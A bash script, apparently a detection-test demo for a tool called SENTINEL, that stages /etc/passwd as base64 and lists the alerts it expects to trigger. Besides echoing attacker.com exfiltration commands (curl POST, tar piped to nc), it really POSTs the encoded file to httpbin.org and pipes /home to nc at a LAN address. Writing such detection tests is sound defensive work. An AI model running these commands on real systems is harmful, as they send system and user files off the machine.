#!/bin/bash
# ════════════════════════════════════════════════════════
#  SENTINEL — Data Exfiltration Demo
#  Simulates: T1048 Exfiltration, T1003.008 Cred Dump
# ════════════════════════════════════════════════════════

RED='\033[0;31m'; ORANGE='\033[0;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

echo -e "${BOLD}${RED}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║  SENTINEL DEMO: Data Exfiltration                    ║"
echo "║  MITRE: T1048 / T1003.008 — Exfiltration            ║"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${RESET}"

echo -e "${ORANGE}[1/3] Credential File Staging — T1003.008${RESET}"
echo -e "    Command: ${BOLD}cat /etc/passwd | base64 > /tmp/data.b64${RESET}"
cat /etc/passwd | base64 > /tmp/sentinel_test_data.b64
echo -e "    ${RED}[STAGED]${RESET} Encoded credentials in /tmp/sentinel_test_data.b64"
sleep 1

echo ""
echo -e "${ORANGE}[2/3] HTTP Upload Attempt — T1048.003${RESET}"
echo -e "    Command: ${BOLD}curl -X POST -d @/tmp/sentinel_test_data.b64 http://attacker.com/collect${RESET}"
curl --max-time 3 -s -X POST \
    -d @/tmp/sentinel_test_data.b64 \
    "http://httpbin.org/post" > /dev/null 2>&1 || \
    echo "    [simulated] curl POST with encoded data — detected by process monitor"
sleep 1

echo ""
echo -e "${ORANGE}[3/3] Archive + Transfer — T1048${RESET}"
echo -e "    Command: ${BOLD}tar czf - /home | nc attacker.com 4444${RESET}"
echo "tar czf - /home 2>/dev/null | nc -w3 192.168.1.100 4444 || echo simulated" | bash 2>/dev/null || true
sleep 1

rm -f /tmp/sentinel_test_data.b64
echo ""
echo -e "${GREEN}[+] Exfiltration demo complete.${RESET}"
echo -e "${CYAN}[*] Expected detections:${RESET} CURL_EXFILTRATION, DATA_EXFILTRATION, PASSWD_FILE_ACCESS"
